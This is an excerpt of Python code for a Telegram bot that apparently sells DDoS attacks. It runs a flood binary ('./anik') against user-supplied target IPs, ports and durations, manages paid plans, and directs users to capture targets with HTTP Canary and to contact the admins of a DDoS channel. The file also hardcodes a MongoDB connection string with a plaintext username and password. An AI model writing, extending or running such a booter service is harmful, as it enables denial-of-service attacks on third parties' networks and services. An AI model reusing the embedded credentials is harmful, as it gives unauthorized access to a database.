...
MONGO_URI = 'mongodb+srv://Harshu:harsh11@cluster0.xhzllxu.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./anik {target_ip} {target_port} {duration} 60"
    try:
...
def process_attack_command(message):
    try:
        ...
        bot.send_message(message.chat.id, f"*☢️ Attack started ☢️\n\n⚒️ Host: {target_ip}\n🔱 Port: {target_port}\n ⏰ Time: {duration}*", parse_mode='Markdown')
    except Exception as e:
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/TEAMNOVADDOS*", parse_mode='Markdown')
        ...
        if user_data:
            ...
            response = (f"*☢️ USERNAME: {username}\n"
                        f"🌋 Plan: {plan}\n"
        ...
        bot.reply_to(message, "*💌 Help Section 💌\n\n⬢ Wait For 5 Minutes After 1 attack..\n⬢ Send Your ip port time only after the bot asks you to send it After you press The instant ++ 🔱 Option..\n\nIf you don't know how to use http canary app for getting Ip & Port then Click on the link below and watch it first : https://t.me/TeamNovaDdos/3443*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*🔆 Contact Admins 🔆*\n\n*🔱 ADMIN #1:- @ANIK_X_PRO\n🔱 ADMIN #2:- @NOOOBFK*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*❌ Invalid option ❌\n\n🤧 This means There is no such commands in this bot..\n⬢ Kindly Press /start To refresh the bot...\n⬢ Please Contact the Admins of @TeamNovaDdos For Assistance*", parse_mode='Markdown')
